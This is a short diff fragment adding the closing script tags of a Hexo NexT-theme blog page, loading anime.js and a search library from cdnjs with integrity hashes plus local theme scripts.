+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
